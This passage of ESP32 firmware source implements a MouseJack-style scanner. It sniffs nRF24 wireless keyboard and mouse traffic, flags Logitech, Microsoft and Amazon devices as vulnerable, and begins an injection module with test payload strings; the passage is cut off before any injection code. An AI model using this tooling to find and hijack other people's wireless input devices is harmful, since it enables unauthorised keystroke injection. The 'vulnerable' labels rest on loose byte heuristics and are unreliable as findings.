static int mjVisibleLogLines() {
  const int avail = mjLogEndY() - kMjLogStartY;
  if (avail <= 0) {
    return 1;
  }
  const int n = avail / kMjLineHeight;
  if (n < 1) {
    return 1;
  }
  return n > kMjMaxLogLines ? kMjMaxLogLines : n;
}

static byte mjGetRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

static void mjSetRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

static void mjWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer((reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) {
    SPI.transfer(data[i]);
  }
  digitalWrite(CSN, HIGH);
}

static void mjDisable() { digitalWrite(CE, LOW); }
static void mjEnable() { digitalWrite(CE, HIGH); }

static void mjPowerUp() {
  mjSetRegister(_MJ_CONFIG, mjGetRegister(_MJ_CONFIG) | 0x02);
  delayMicroseconds(130);
}

static void mjPowerDown() {
  mjSetRegister(_MJ_CONFIG, mjGetRegister(_MJ_CONFIG) & ~0x02);
}

static void mjFlushRx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE2);
  digitalWrite(CSN, HIGH);
}

static void mjInitRadioSpi() {
  SPI.begin(NRF24_SPI_SCK, NRF24_SPI_MISO, NRF24_SPI_MOSI, NRF24_SPI_SS);
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(10000000);
  SPI.setBitOrder(MSBFIRST);
}

static void mjApplyChannel(uint8_t ch) {
  mjDisable();
  mjSetRegister(_MJ_RF_CH, ch);
  mjFlushRx();
  mjEnable();
  delayMicroseconds(130);
}

static void mjConfigureRadio() {
  mjDisable();
  mjPowerUp();
  mjWriteRegMulti(_MJ_RX_ADDR_P0, kMjPromiscAddr, 5);
  mjSetRegister(_MJ_EN_AA, 0x00);
  mjSetRegister(_MJ_EN_RXADDR, 0x01);
  mjSetRegister(_MJ_SETUP_AW, 0x03);
  mjSetRegister(_MJ_SETUP_RETR, 0x00);
  mjSetRegister(_MJ_RF_SETUP, 0x0F);  // 2 Mbps, high gain
  mjSetRegister(_MJ_RX_PW_P0, kMjPayloadMax);
  mjSetRegister(_MJ_CONFIG, 0x03);    // PWR_UP | PRIM_RX, CRC off
  mjApplyChannel(s_channel);
}

static uint8_t mjLogitechChecksum(const uint8_t* p, int len) {
  uint8_t ck = 0xFF;
  for (int i = 0; i < len - 1; i++) {
    ck = (uint8_t)((ck - p[i]) & 0xFF);
  }
  return (uint8_t)((ck + 1) & 0xFF);
}

static bool mjLooksLikeLogitech(const uint8_t* p, int len) {
  if (len < 6 || len > 22) {
    return false;
  }
  return mjLogitechChecksum(p, len) == p[len - 1];
}

// Logitech Unifying unencrypted HID reports (MouseJack-vulnerable class).
static bool mjLogitechVulnerableReport(const uint8_t* p, int len) {
  if (!mjLooksLikeLogitech(p, len) || len < 8) {
    return false;
  }
  // Unencrypted keyboard / multimedia frames commonly seen in research dumps.
  const uint8_t t = p[1];
  if (t == 0x10 || t == 0x11 || t == 0x01 || t == 0xC1) {
    return true;
  }
  // Unencrypted mouse keepalives / motion without encryption markers.
  if (t == 0x00 && len <= 10) {
    return true;
  }
  return false;
}

static bool mjLooksLikeMicrosoft(const uint8_t* p, int len) {
  if (len < 8) {
    return false;
  }
  // Microsoft wireless HID often carries a stable header nibble pattern.
  if (p[0] == 0x0A || p[0] == 0x08 || p[0] == 0x0F) {
    return true;
  }
  return false;
}

static bool mjLooksLikeAmazon(const uint8_t* p, int len) {
  if (len < 6) {
    return false;
  }
  // Fire TV / Amazon remotes on nRF24 often use short frames with 0x0D/0x40 prefixes.
  return (p[0] == 0x0D || p[0] == 0x40 || p[0] == 0x4F);
}

static bool mjPayloadInteresting(const uint8_t* p, int len) {
  if (len < 5) {
    return false;
  }
  int zeros = 0;
  int ff = 0;
  for (int i = 0; i < len; i++) {
    if (p[i] == 0x00) zeros++;
    if (p[i] == 0xFF) ff++;
  }
  if (zeros >= len - 1 || ff >= len - 1) {
    return false;
  }
  return mjLooksLikeLogitech(p, len) || mjLooksLikeMicrosoft(p, len) || mjLooksLikeAmazon(p, len);
}

static int mjTrimLen(const uint8_t* p, int maxLen) {
  int len = maxLen;
  while (len > 1 && p[len - 1] == 0x00) {
    len--;
  }
  return len;
}

static String mjAddrToString(const uint8_t* a) {
  char buf[16];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X", a[0], a[1], a[2], a[3], a[4]);
  return String(buf);
}

static const char* mjVendorName(MjVendor v) {
  switch (v) {
    case MjVendor::Logitech: return "Logitech";
    case MjVendor::Microsoft: return "Microsoft";
    case MjVendor::Amazon: return "Amazon";
    case MjVendor::Other: return "nRF HID";
    default: return "Unknown";
  }
}

static void mjClassify(const uint8_t* p, int len, MjVendor& vendor, bool& vulnerable) {
  vendor = MjVendor::Unknown;
  vulnerable = false;
  if (mjLooksLikeLogitech(p, len)) {
    vendor = MjVendor::Logitech;
    vulnerable = mjLogitechVulnerableReport(p, len);
    return;
  }
  if (mjLooksLikeMicrosoft(p, len)) {
    vendor = MjVendor::Microsoft;
    // Many older Microsoft wireless HID stacks were in scope of MouseJack-class attacks.
    vulnerable = true;
    return;
  }
  if (mjLooksLikeAmazon(p, len)) {
    vendor = MjVendor::Amazon;
    vulnerable = true;
    return;
  }
  vendor = MjVendor::Other;
}

static void mjRebuildCounts() {
  s_deviceCount = 0;
  s_vulnCount = 0;
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (!s_devices[i].used) {
      continue;
    }
    s_deviceCount++;
    if (s_devices[i].vulnerable) {
      s_vulnCount++;
    }
  }
}

static void mjAppendLogLine(const String& text, uint16_t color) {
  const int visible = mjVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    s_logBuffer[i] = s_logBuffer[i - 1];
    s_logColor[i] = s_logColor[i - 1];
  }
  s_logBuffer[0] = text;
  s_logColor[0] = color;
  if (s_logIndex < visible) {
    s_logIndex++;
  }
  s_mjLogDirty = true;
}

static constexpr int kMjStatPadX = 10;
static constexpr int kMjStatValueX = 70;
static constexpr int kMjStatTextDy = 2;

static void mjPaintTextLine(int x, int y, int maxW, int lineH,
                            String& cacheText, uint16_t& cacheColor, int& cacheW,
                            const String& text, uint16_t color) {
  if (cacheText == text && cacheColor == color) {
    return;
  }
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  const int newW = text.length() ? (tft.textWidth(text) + 2) : 0;
  int clearW = cacheW > newW ? cacheW : newW;
  if (clearW < 8) {
    clearW = maxW;
  }
  if (clearW > maxW) {
    clearW = maxW;
  }
  tft.fillRect(x, y, clearW, lineH, TFT_BLACK);
  if (text.length()) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(x, y + kMjStatTextDy);
    tft.print(text);
  }
  cacheText = text;
  cacheColor = color;
  cacheW = newW > 0 ? newW : 0;
}

static void mjRedrawLog() {
  const int endY = mjLogEndY();
  const int visible = mjVisibleLogLines();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = kMjLogStartY + i * kMjLineHeight;
    if (y + kMjLineHeight > endY) {
      break;
    }
    if (i < s_logIndex) {
      mjPaintTextLine(kMjStatPadX, y, maxW, kMjLineHeight,
                      s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                      s_logBuffer[i], s_logColor[i]);
    } else {
      mjPaintTextLine(kMjStatPadX, y, maxW, kMjLineHeight,
                      s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                      String(""), UI_DIM_TEXT);
    }
  }
  s_mjLogDirty = false;
}

static void mjDrawStatusValue(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kMjStatusLines) {
    return;
  }
  const int y = kMjStatusTextY + line * kMjLineHeight;
  const int maxW = tft.width() - kMjStatValueX - 8;
  mjPaintTextLine(kMjStatValueX, y, maxW, kMjLineHeight,
                  s_statusText[line], s_statusColor[line], s_statusDrawnW[line],
                  text, color);
}

static void mjDrawTextBoxes() {
  const int logH = mjLogBoxH();
  const int endY = mjLogEndY();
  tft.fillRect(0, kMjStatusY - 2, tft.width(), endY - kMjStatusY + 4, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kMjStatusY, tft.width() - 8, kMjStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kMjLogBoxTop, tft.width() - 8, logH, 3, UI_LINE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(kMjStatPadX, kMjStatusY + 3);
  tft.print("Scan Status");
  tft.setCursor(kMjStatPadX, kMjLogBoxTop + 3);
  tft.print("Devices");

  static const char* kLabels[kMjStatusLines] = {"Ch", "Found", "Mode", "State"};
  for (int i = 0; i < kMjStatusLines; i++) {
    const int y = kMjStatusTextY + i * kMjLineHeight + kMjStatTextDy;
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(kMjStatPadX, y);
    tft.print(kLabels[i]);
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kMjMaxLogLines; i++) {
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
}

static void mjUpdateStatusPanel() {
  char chVal[28];
  snprintf(chVal, sizeof(chVal), "%u  %lu pkts", (unsigned)s_channel,
           (unsigned long)s_packetTotal);
  mjDrawStatusValue(0, String(chVal), UI_TEXT);

  char foundVal[28];
  snprintf(foundVal, sizeof(foundVal), "%u  Vuln %u", (unsigned)s_deviceCount,
           (unsigned)s_vulnCount);
  mjDrawStatusValue(1, String(foundVal),
                    s_vulnCount > 0 ? UI_WARN : (s_deviceCount > 0 ? UI_OK : UI_DIM_TEXT));

  mjDrawStatusValue(2, "Channel hop", UI_DIM_TEXT);

  if (s_paused) {
    mjDrawStatusValue(3, "Paused", UI_WARN);
  } else {
    mjDrawStatusValue(3, scanning ? "Scanning" : "Stopped",
                      scanning ? UI_OK : UI_DIM_TEXT);
  }
  s_mjStatusDirty = false;
}

static void mjRebuildDeviceLines() {
  const int visible = mjVisibleLogLines();
  s_logIndex = 0;
  for (int i = 0; i < kMjMaxLogLines; i++) {
    s_logBuffer[i] = "";
    s_logColor[i] = UI_DIM_TEXT;
  }

  auto pushDev = [&](const MjDevice& d) {
    if (s_logIndex >= visible) {
      return;
    }
    String line = mjAddrToString(d.addr);
    line += " ";
    line += mjVendorName(d.vendor);
    if (d.vulnerable) {
      line += " VULN";
    }
    line += " x";
    line += String(d.hits);
    s_logBuffer[s_logIndex] = line;
    s_logColor[s_logIndex] = d.vulnerable ? UI_WARN : UI_TEXT;
    s_logIndex++;
  };

  for (int i = 0; i < kMjMaxDevices; i++) {
    if (s_devices[i].used && s_devices[i].vulnerable) {
      pushDev(s_devices[i]);
    }
  }
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (s_devices[i].used && !s_devices[i].vulnerable) {
      pushDev(s_devices[i]);
    }
  }
  if (s_deviceCount == 0) {
    s_logBuffer[0] = "[*] Waiting for HID traffic...";
    s_logColor[0] = UI_DIM_TEXT;
    s_logIndex = 1;
  }
  s_mjLogDirty = true;
  s_mjListDirty = false;
}

static void mjFlushUi(bool force = false) {
  const uint32_t now = millis();
  if (!force && (now - s_mjLastUiMs) < kMjUiMinIntervalMs) {
    return;
  }
  if (!force && !s_mjLogDirty && !s_mjStatusDirty && !s_mjListDirty) {
    return;
  }
  s_mjLastUiMs = now;
  if (s_mjListDirty) {
    mjRebuildDeviceLines();
  }
  if (s_mjStatusDirty || force) {
    mjUpdateStatusPanel();
  }
  if (s_mjLogDirty || force) {
    mjRedrawLog();
  }
}

static int mjFindDevice(const uint8_t* addr) {
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (s_devices[i].used && memcmp(s_devices[i].addr, addr, 5) == 0) {
      return i;
    }
  }
  return -1;
}

static int mjAllocDevice() {
  int oldest = -1;
  uint32_t oldestMs = UINT32_MAX;
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (!s_devices[i].used) {
      return i;
    }
    if (s_devices[i].lastSeenMs < oldestMs) {
      oldestMs = s_devices[i].lastSeenMs;
      oldest = i;
    }
  }
  return oldest;
}

static void mjNoteDevice(const uint8_t* addr, uint8_t ch, MjVendor vendor, bool vulnerable) {
  int idx = mjFindDevice(addr);
  const bool isNew = (idx < 0);
  if (isNew) {
    idx = mjAllocDevice();
    if (idx < 0) {
      return;
    }
    memset(&s_devices[idx], 0, sizeof(MjDevice));
    memcpy(s_devices[idx].addr, addr, 5);
    s_devices[idx].used = true;
    s_devices[idx].hits = 0;
  }

  s_devices[idx].hits++;
  s_devices[idx].lastCh = ch;
  s_devices[idx].lastSeenMs = millis();
  if (vendor != MjVendor::Unknown) {
    s_devices[idx].vendor = vendor;
  }
  if (vulnerable) {
    s_devices[idx].vulnerable = true;
  }

  mjRebuildCounts();
  s_mjStatusDirty = true;
  if (isNew || vulnerable || (s_devices[idx].hits % 8) == 0) {
    s_mjListDirty = true;
  }
  mjSharedPublish(s_devices[idx].addr, s_devices[idx].lastCh, s_devices[idx].vulnerable,
                  mjVendorName(s_devices[idx].vendor));
}

// Build a stable pseudo-address from payload fingerprint for tracking.
static void mjDeriveAddr(const uint8_t* p, int len, uint8_t out[5]) {
  // Prefer bytes that look like address remnants after a 0x55 prefix match.
  if (len >= 5) {
    out[0] = p[0];
    out[1] = p[1];
    out[2] = p[2];
    out[3] = p[3];
    out[4] = p[4];
    // Avoid all-identical garbage addresses.
    if (!(out[0] == out[1] && out[1] == out[2] && out[2] == out[3] && out[3] == out[4])) {
      return;
    }
  }
  uint32_t h = 2166136261u;
  for (int i = 0; i < len; i++) {
    h ^= p[i];
    h *= 16777619u;
  }
  out[0] = (uint8_t)(h >> 24);
  out[1] = (uint8_t)(h >> 16);
  out[2] = (uint8_t)(h >> 8);
  out[3] = (uint8_t)(h);
  out[4] = (uint8_t)(len ^ p[0]);
}

static bool mjRxAvailable() {
  return (mjGetRegister(_MJ_STATUS) & 0x40) != 0;
}

static void mjReadPacket() {
  uint8_t payload[kMjPayloadMax];
  digitalWrite(CSN, LOW);
  SPI.transfer(0x61);
  for (int i = 0; i < kMjPayloadMax; i++) {
    payload[i] = SPI.transfer(0xFF);
  }
  digitalWrite(CSN, HIGH);
  mjSetRegister(_MJ_STATUS, 0x70);

  const int len = mjTrimLen(payload, kMjPayloadMax);
  if (!mjPayloadInteresting(payload, len)) {
    return;
  }

  s_packetTotal++;
  MjVendor vendor;
  bool vulnerable;
  mjClassify(payload, len, vendor, vulnerable);

  uint8_t addr[5];
  mjDeriveAddr(payload, len, addr);
  mjNoteDevice(addr, s_channel, vendor, vulnerable);
  s_mjStatusDirty = true;
}

static void mjPollPackets() {
  uint8_t guard = 0;
  while (scanning && !s_paused && mjRxAvailable() && guard < 8) {
    mjReadPacket();
    guard++;
  }
}

static void mjExpireDevices() {
  const uint32_t now = millis();
  bool changed = false;
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (s_devices[i].used && (now - s_devices[i].lastSeenMs) > kMjDeviceTimeoutMs) {
      s_devices[i].used = false;
      changed = true;
    }
  }
  if (changed) {
    mjRebuildCounts();
    s_mjListDirty = true;
    s_mjStatusDirty = true;
  }
}

static void mjStepHop() {
  if (s_paused) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_lastHopMs < kMjHopIntervalMs) {
    return;
  }
  s_lastHopMs = now;
  s_hopIndex = (s_hopIndex + 1) % kMjChannelCount;
  s_channel = kMjChannels[s_hopIndex];
  mjApplyChannel(s_channel);
  s_mjStatusDirty = true;
}

static void mjClearDevices() {
  for (int i = 0; i < kMjMaxDevices; i++) {
    s_devices[i].used = false;
  }
  s_packetTotal = 0;
  s_deviceCount = 0;
  s_vulnCount = 0;
  s_mjListDirty = true;
  s_mjStatusDirty = true;
  mjFlushUi(true);
  mjAppendLogLine("[*] List cleared", UI_DIM_TEXT);
  mjFlushUi(true);
}

static void mjTogglePause() {
  s_paused = !s_paused;
  if (s_paused) {
    mjDisable();
    mjAppendLogLine("[*] Paused", UI_WARN);
  } else {
    mjEnable();
    mjAppendLogLine("[+] Scanning", UI_OK);
  }
  s_mjStatusDirty = true;
  mjFlushUi(true);
}

static unsigned long s_mjLastBtnMs = 0;
static constexpr unsigned long kMjNavDebounceMs = 80;

static void mjWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isTouchNavButtonPressed(pin) && millis() - t0 < 400) {
    delay(5);
  }
  delay(30);
}

void mouseJackHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_mjLastBtnMs < kMjNavDebounceMs) {
    return;
  }
  // Remapped layout: SELECT=Pause (the most important action, was DOWN),
  // RIGHT=Clear (secondary, was LEFT). LEFT is the universal Exit, handled
  // in mouseJackLoop(). Also switched from isTouchNavButtonPressedEdge
  // (touch-tap only) to isButtonPressedEdge so the physical buttons
  // actually trigger these actions too.
  if (isButtonPressedEdge(BTN_RIGHT)) {
    mjClearDevices();
    s_mjLastBtnMs = millis();
    mjWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT)) {
    mjTogglePause();
    s_mjLastBtnMs = millis();
    mjWaitNavRelease(BTN_SELECT);
  }
}

void runUI() {
  static constexpr int kBarY = 20;
  static constexpr int kBarH = 16;
  static constexpr int kIconSz = 16;
  static constexpr int kIconN = 3;
  // Same 3-icon spacing as Scanner: 170 / 210 / 10.
  static int iconX[kIconN] = {170, 210, 10};
  static int iconY = kBarY;

  static const unsigned char* icons[kIconN] = {
    bitmap_icon_undo,
    bitmap_icon_start,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, kBarY, 240, kBarH, DARK_GRAY);
    for (int i = 0; i < kIconN; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, UI_ICON);
      }
    }
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, kBarY + kBarH, 240, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], kIconSz, kIconSz, UI_ICON);
      animationState = 2;
      switch (activeIcon) {
        case 0: mjClearDevices(); break;
        case 1: mjTogglePause(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > kBarY && y < kBarY + kBarH) {
        for (int i = 0; i < kIconN; i++) {
          if (x > iconX[i] && x < iconX[i] + kIconSz) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 2) {
                feature_exit_requested = true;
                scanning = false;
              } else {
                tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void mouseJackSetup() {
  setTouchButtonInputEnabled(true);
  bleSetMouseJackNavLabels();
  bleClearBody(TFT_BLACK);

  uiDrawn = false;
  scanning = true;
  s_paused = false;
  s_channel = kMjChannels[0];
  s_hopIndex = 0;
  s_lastHopMs = millis();
  s_packetTotal = 0;
  s_deviceCount = 0;
  s_vulnCount = 0;
  s_logIndex = 0;
  s_mjLogDirty = false;
  s_mjStatusDirty = false;
  s_mjListDirty = false;
  s_mjLastUiMs = 0;
  for (int i = 0; i < kMjMaxDevices; i++) {
    s_devices[i].used = false;
  }
  for (int i = 0; i < kMjMaxLogLines; i++) {
    s_logBuffer[i] = "";
    s_logColor[i] = UI_DIM_TEXT;
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < kMjStatusLines; i++) {
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();

  runUI();
  mjDrawTextBoxes();
  mjAppendLogLine("[+] MouseJack Scan ready", UI_WARN);
  mjAppendLogLine("[*] Hopping Unifying channels", UI_DIM_TEXT);
  s_mjStatusDirty = true;
  mjFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();
  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);
  mjInitRadioSpi();
  mjConfigureRadio();
  redrawTouchButtonBar();
}

void mouseJackLoop() {
  scanning = true;
  while (scanning) {
    // Remapped layout: LEFT exits now (was SELECT).
    if (feature_active && (feature_exit_requested || isButtonPressed(BTN_LEFT))) {
      feature_exit_requested = true;
      scanning = false;
      break;
    }

    mouseJackHandleNavButtons();
    maintainTouchNavBar();
    runUI();
    mjStepHop();
    mjPollPackets();
    mjExpireDevices();
    mjFlushUi(false);
    delay(1);
  }
}

void exit() {
  scanning = false;
  mjDisable();
  mjPowerDown();
  digitalWrite(CSN, HIGH);
  restoreSdAfterSharedSpi();
}

}  // namespace MouseJack

namespace MouseJackInject {

#define CE  NRF24_SCAN_CE
#define CSN NRF24_SCAN_CSN

void runUI();

#define _INJ_CONFIG     0x00
#define _INJ_EN_AA      0x01
#define _INJ_EN_RXADDR  0x02
#define _INJ_SETUP_AW   0x03
#define _INJ_SETUP_RETR 0x04
#define _INJ_RF_CH      0x05
#define _INJ_RF_SETUP   0x06
#define _INJ_STATUS     0x07
#define _INJ_RX_ADDR_P0 0x0A
#define _INJ_TX_ADDR    0x10
#define _INJ_RX_PW_P0   0x11

static constexpr int kInjPayloadMax = 32;
static constexpr int kInjMaxTargets = kMjSharedMax;
static constexpr int kInjMaxLogLines = 14;
static constexpr int kInjStatusLines = 4;
static constexpr int kInjLineHeight = 12;
static constexpr int kInjToolbarBottom = 36;
static constexpr int kInjToolbarGap = 8;
static constexpr int kInjStatusY = kInjToolbarBottom + kInjToolbarGap;
static constexpr int kInjBoxHeaderH = 15;
static constexpr int kInjStatusTextY = kInjStatusY + kInjBoxHeaderH;
static constexpr int kInjStatusBoxH = kInjBoxHeaderH + (kInjStatusLines * kInjLineHeight) + 4;
static constexpr int kInjLogGap = 4;
static constexpr int kInjLogBoxTop = kInjStatusY + kInjStatusBoxH + kInjLogGap;
static constexpr int kInjLogStartY = kInjLogBoxTop + kInjBoxHeaderH;
static constexpr int kInjLogBottomPad = 4;
static constexpr uint32_t kInjUiMinIntervalMs = 100;
static constexpr uint32_t kInjHopIntervalMs = 50;
static constexpr uint32_t kInjKeyDelayMs = 12;

static const uint8_t kInjChannels[] = {
  2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
  16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30,
  32, 35, 40, 42, 46, 50, 52, 55, 60, 62, 65, 68, 70, 72, 74, 76, 78, 80, 82
};
static constexpr int kInjChannelCount = sizeof(kInjChannels) / sizeof(kInjChannels[0]);

struct InjTarget {
  uint8_t addr[5];
  uint8_t channel;
  bool used;
  bool vulnerable;
  char vendor[12];
};

static const char* kPayloads[] = {
  "hello",
  "Hello World!",
  "test123",
  "ESP32-DIV",
  "CiferTech",
  "admin",
};
static constexpr int kPayloadCount = sizeof(kPayloads) / sizeof(kPayloads[0]);

static bool uiDrawn = false;
static volatile bool s_active = false;
static bool s_scanning = false;
static bool s_injecting = false;
static uint8_t s_channel = 2;
static int s_hopIndex = 0;
static uint32_t s_lastHopMs = 0;
static int s_prefixByte = 0;
static int s_targetIndex = 0;
static int s_targetCount = 0;
static int s_payloadIndex = 0;
static uint32_t s_injectCount = 0;

static InjTarget s_targets[kInjMaxTargets];

static String s_logBuffer[kInjMaxLogLines];
static uint16_t s_logColor[kInjMaxLogLines];
static int s_logIndex = 0;
static String s_logDrawn[kInjMaxLogLines];
static uint16_t s_logDrawnColor[kInjMaxLogLines];
static int s_logDrawnW[kInjMaxLogLines];

static String s_statusText[kInjStatusLines];
static uint16_t s_statusColor[kInjStatusLines];
static int s_statusDrawnW[kInjStatusLines];

static bool s_logDirty = false;
static bool s_statusDirty = false;
static uint32_t s_lastUiMs = 0;

static int injLogBoxBottom() { return bleContentBottom() - kInjLogBottomPad; }
static int injLogBoxH() {
  const int h = injLogBoxBottom() - kInjLogBoxTop;
  return h > (kInjBoxHeaderH + kInjLineHeight) ? h : (kInjBoxHeaderH + kInjLineHeight);
}
static int injLogEndY() { return kInjLogBoxTop + injLogBoxH() - 2; }
static int injVisibleLogLines() {
  const int avail = injLogEndY() - kInjLogStartY;
  if (avail <= 0) return 1;
  const int n = avail / kInjLineHeight;
  return n < 1 ? 1 : (n > kInjMaxLogLines ? kInjMaxLogLines : n);
}

static byte injGetRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

static void injSetRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

static void injWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer((reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
  digitalWrite(CSN, HIGH);
}

static void injDisable() { digitalWrite(CE, LOW); }
static void injEnable() { digitalWrite(CE, HIGH); }

static void injPowerUp() {
  injSetRegister(_INJ_CONFIG, injGetRegister(_INJ_CONFIG) | 0x02);
  delayMicroseconds(130);
}

static void injPowerDown() {
  injSetRegister(_INJ_CONFIG, injGetRegister(_INJ_CONFIG) & ~0x02);
}

static void injFlushRx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE2);
  digitalWrite(CSN, HIGH);
}

static void injFlushTx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE1);
  digitalWrite(CSN, HIGH);
}

static void injInitSpi() {
  SPI.begin(NRF24_SPI_SCK, NRF24_SPI_MISO, NRF24_SPI_MOSI, NRF24_SPI_SS);
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(10000000);
  SPI.setBitOrder(MSBFIRST);
}

static uint8_t injLogitechChecksum(const uint8_t* p, int len) {
  uint8_t ck = 0xFF;
  for (int i = 0; i < len - 1; i++) {
    ck = (uint8_t)((ck - p[i]) & 0xFF);
  }
  return (uint8_t)((ck + 1) & 0xFF);
}

static bool injLooksLikeLogitech(const uint8_t* p, int len) {
  if (len < 6 || len > 22) return false;
  return injLogitechChecksum(p, len) == p[len - 1];
}

static constexpr int kInjStatPadX = 10;
static constexpr int kInjStatValueX = 70;
static constexpr int kInjStatTextDy = 2;

static void injPaintTextLine(int x, int y, int maxW, int lineH,
                             String& cacheText, uint16_t& cacheColor, int& cacheW,
                             const String& text, uint16_t color) {
  if (cacheText == text && cacheColor == color) return;
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  const int newW = text.length() ? (tft.textWidth(text) + 2) : 0;
  int clearW = cacheW > newW ? cacheW : newW;
  if (clearW < 8) clearW = maxW;
  if (clearW > maxW) clearW = maxW;
  tft.fillRect(x, y, clearW, lineH, TFT_BLACK);
  if (text.length()) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(x, y + kInjStatTextDy);
    tft.print(text);
  }
  cacheText = text;
  cacheColor = color;
  cacheW = newW > 0 ? newW : 0;
}

static void injAppendLog(const String& text, uint16_t color) {
  const int visible = injVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    s_logBuffer[i] = s_logBuffer[i - 1];
    s_logColor[i] = s_logColor[i - 1];
  }
  s_logBuffer[0] = text;
  s_logColor[0] = color;
  if (s_logIndex < visible) s_logIndex++;
  s_logDirty = true;
}

static void injRedrawLog() {
  const int endY = injLogEndY();
  const int visible = injVisibleLogLines();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = kInjLogStartY + i * kInjLineHeight;
    if (y + kInjLineHeight > endY) break;
    if (i < s_logIndex) {
      injPaintTextLine(kInjStatPadX, y, maxW, kInjLineHeight,
                       s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                       s_logBuffer[i], s_logColor[i]);
    } else {
      injPaintTextLine(kInjStatPadX, y, maxW, kInjLineHeight,
                       s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                       String(""), UI_DIM_TEXT);
    }
  }
  s_logDirty = false;
}

static void injDrawStatusValue(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kInjStatusLines) return;
  const int y = kInjStatusTextY + line * kInjLineHeight;
  const int maxW = tft.width() - kInjStatValueX - 8;
  injPaintTextLine(kInjStatValueX, y, maxW, kInjLineHeight,
                   s_statusText[line], s_statusColor[line], s_statusDrawnW[line],
                   text, color);
}

static String injAddrStr(const uint8_t* a) {
  char buf[16];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X", a[0], a[1], a[2], a[3], a[4]);
  return String(buf);
}

static void injUpdateStatusPanel() {
